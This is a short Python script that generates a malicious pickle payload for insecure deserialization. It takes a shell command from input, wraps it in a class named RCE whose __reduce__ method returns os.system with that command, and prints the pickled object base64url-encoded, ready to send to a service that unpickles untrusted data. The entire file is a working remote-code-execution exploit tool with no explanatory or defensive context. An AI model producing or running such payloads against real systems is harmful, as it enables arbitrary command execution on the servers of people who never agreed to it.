import pickle
from base64 import urlsafe_b64encode as b64e
import os

command = input("enter the command:")

class RCE:
    def __reduce__(self):
        cmd = (command)
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(b64e(pickled))